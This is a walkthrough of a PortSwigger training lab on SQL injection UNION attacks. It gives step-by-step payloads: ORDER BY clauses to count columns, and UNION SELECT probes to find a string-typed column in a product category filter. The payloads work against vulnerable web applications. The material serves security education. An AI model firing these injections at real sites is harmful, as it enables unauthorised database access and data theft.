# SQL injection UNION attack, finding a column containing text

**Lab URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

- Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter: `'+UNION+SELECT+NULL,NULL,NULL--`
- Try replacing each null with the random value provided by the lab, for example: `'+UNION+SELECT+'abcdef',NULL,NULL--`
- If an error occurs, move on to the next null and try that instead.

Having identified the required number of columns . next task is to discover a column that has a string data type so that you can use this to extract arbitrary data from the database. You can do this by injecting a query containing NULLs, as you did previously and systematically replacing each NULL with **‘a’. **For example, if you know that the query must return three columns, you can inject the following.

```text
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

When the query is executed, you can see an additional row of data containing the value **‘a’. **You can then use that relevant column which has the data type string to extract data from the database.

If the data type of a column is not compatible with string data, the injected query will cause a database error. You can use that database errors to determine the columns which have the data type string.

Let’s solve the **Lab-4 **[**SQL injection UNION attack, finding a column containing text**](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

SQLi vulnerability: product category filter.

**STEP #1 Determine the number of columns returned by the original query.**

As we discussed in the previous post, we can do this using either Injecting a series of ORDER BY clauses or injecting a series of UNION SELECT payloads.

```sql
'+UNION+SELECT+NULL,NULL,NULL—
```

For the demonstration of this Lab exercise, I am using the ORDER BY clause.

```text
' ORDER BY 1 --
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/images/e315e4067a24_001.png)

```text
' ORDER BY 2 --
```

```text
' ORDER BY 3 --
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/images/e315e4067a24_002.png)

```text
' ORDER BY 4 --
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/images/e315e4067a24_003.png)

```text
' ORDER BY 4 --                          Returns an error message.
```

**Therefore number of columns returned by the original query is 3**

**STEP #2 Discover the column that has a string data type.**

```text
' UNION SELECT 'a', NULL, NULL --
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/images/e315e4067a24_004.png)

```text
' UNION SELECT NULL, 'a', NULL --
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/SQL_Injection/images/e315e4067a24_005.png)

```text
' UNION SELECT NULL, NULL, 'a' --
```

```text
' UNION SELECT 'a', NULL, NULL--         Returns an error message.
' UNION SELECT NULL, 'a', NULL--         Returns 200 response code.
' UNION SELECT NULL, NULL, 'a'--         Returns an error message.
```

**Therefore column 2 has the string data type.**

**STEP #3 Return an additional row which contains the string value provided in the lab.**

Value provided by the Lab: ‘**NAv682’**

You can use the provided string value instead of ‘a’ to solve the Lab exercise as follows:

```text
' UNION SELECT NULL, 'NAv682', NULL --
```

### Why It Works

The application has a SQL injection vulnerability in product category filter, which can be exploited by crafting input that bypasses the insufficient validation in place.

### Key Takeaways

- This lab demonstrates using a UNION attack to retrieve data from other tables.
- The SQL injection vulnerability is exploitable because user input is processed without adequate validation.
